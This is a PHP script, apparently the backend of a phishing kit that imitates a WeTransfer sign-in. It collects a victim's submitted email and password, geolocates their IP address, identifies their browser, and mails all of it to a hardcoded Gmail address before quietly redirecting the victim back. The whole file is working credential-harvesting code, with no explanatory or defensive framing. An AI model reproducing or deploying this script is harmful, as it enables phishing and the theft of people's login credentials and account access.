<?php
if (isset($_POST['email']))
{

  $email = $_POST['email'];

	
$pass=$_POST['pass'];

$ip_address = getenv("REMOTE_ADDR");
$geopluginURL = 'http://www.geoplugin.net/php.gp?ip='.$ip_address;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
$city = $addrDetailsArr['geoplugin_city']; 
$country = $addrDetailsArr['geoplugin_countryName'];
$agent = $_SERVER["HTTP_USER_AGENT"];






 if (preg_match('/Chrome[\/\s](\d+\.\d+)/', $agent) ) {
  $chrome = "Chrome";
  $broswer = $agent;
  $broswer = $chrome;
  } 
  else if ( preg_match('/Firefox[\/\s](\d+\.\d+)/', $agent) ) {
  $firefox = "Firefox";
  $broswer = $agent;
  $broswer = $firefox;
  } 
else if ( preg_match('/OPR[\/\s](\d+\.\d+)/', $agent) ) {
   $opera = "Opera";
  $broswer = $agent;
  $broswer = $opera;
  }
  
  else if (preg_match('/Edge[\/\s](\d+\.\d+)/', $agent) )  {
   $edge = "Edge";
  $broswer = $agent;
  $broswer = $edge;
  }
  
  else if ( preg_match('/MSIE[\/\s](\d+\.\d+)/', $agent) ) {
   $msie = "Internet Explorer";
  $broswer = $agent;
  $broswer = $msie;
  }
  
  else if ( preg_match('/Safari[\/\s](\d+\.\d+)/', $agent) ) {
   $safari = "Safari";
  $broswer = $agent;
  $broswer = $safari;
  }


$message = "Sign In from We-Transfer\n";
$message .= "Email= $email\n";
$message .= "Pass= $pass\n";
$message .= "Broswer= $broswer\n";
$message .= "City= $city\n"; 
$message .= "Country= $country\n";
$message .= "IP= $ip_address\n";


$send = "robhh001@gmail.com";
$subject = "login! | $country"; 
$headers = "From: Client"; 
$headers .= "MIME-Version:1.0\r\n"; 
$arr=array($send, $ip_address); 
foreach ($arr as $send) 
mail($send,$subject,$message,$headers);


	
header('Location: ' . $_SERVER['HTTP_REFERER']);

}

else{
    header('Location: ' . $_SERVER['HTTP_REFERER']);
    
}
?>